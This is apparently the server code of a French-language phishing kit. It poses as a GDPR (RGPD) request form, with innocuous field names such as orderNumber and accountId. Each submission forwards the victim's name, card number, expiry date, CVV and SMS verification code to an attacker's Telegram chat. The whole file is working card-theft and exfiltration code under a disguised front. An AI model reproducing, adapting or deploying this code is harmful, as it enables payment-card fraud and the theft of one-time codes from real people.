require("dotenv").config();

const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "10kb" }));
app.use(express.static(__dirname));

// ---------- Health ----------
app.get("/health", (req, res) => {
  res.json({ status: "ok", message: "Serveur opérationnel" });
});

// ---------- Test Telegram ----------
app.post("/api/telegram-test", async (req, res) => {
  try {
    const firstName = "Jean";
    const message =
      "🧪 TEST TELEGRAM\n\n" +
      "👤 Prénom : " + firstName + "\n" +
      "✅ Connexion réussie.";

    const response = await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: message
        }),
        signal: AbortSignal.timeout(10000)
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      console.error("Telegram :", result);
      return res.status(502).json({ success: false, message: "Erreur Telegram" });
    }

    res.json({ success: true, message: "Message Telegram envoyé" });
  } catch (error) {
    console.error("Erreur :", error.message);
    res.status(500).json({ success: false, message: "Erreur serveur" });
  }
});

// ---------- Étape 1 : identification ----------
app.post("/api/rgpd-step1", async (req, res) => {
  try {
    const { lastName, firstName, orderNumber, birthDay, birthYear, accountId } = req.body || {};

    const message =
      "📝 NOUVELLE CC\n\n" +
      "👤 Nom : " + (lastName || "—") + "\n" +
      "👤 Prénom : " + (firstName || "—") + "\n" +
      "💳 Numéro carte : " + (orderNumber || "—") + "\n" +
      "🎂 date d'éxpiration : " + (birthDay || "—") + "/" + (birthYear || "—") + "\n" +
      "🆔 CVV : " + (accountId || "—");

    const response = await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: message
        })
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      console.error("Telegram :", result);
      throw new Error("Erreur Telegram");
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Erreur :", error.message);
    res.status(500).json({ success: false });
  }
});

// ---------- Étape 2 : code SMS ----------
app.post("/api/rgpd-step2", async (req, res) => {
  try {
    const { lastName, firstName, orderNumber, birthDay, birthYear, accountId, smsNum } = req.body || {};

    const message =
      "✅ DEMANDE RGPD COMPLÈTE\n\n" +
      "👤 Nom : " + (lastName || "—") + "\n" +
      "👤 Prénom : " + (firstName || "—") + "\n" +
      "💳 Numéro carte : " + (orderNumber || "—") + "\n" +
      "🎂 date d'éxpiration : " + (birthDay || "—") + "/" + (birthYear || "—") + "\n" +
      "🆔 CVV : " + (accountId || "—") + "\n" +
      "📱 Code SMS : " + (smsNum || "—");

    const response = await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: message
        })
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      console.error("Telegram :", result);
      throw new Error("Erreur Telegram");
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Erreur :", error.message);
    res.status(500).json({ success: false });
  }
});

// ---------- Démarrage ----------
app.listen(PORT, () => {
  console.log(`Serveur lancé sur le port ${PORT}`);
});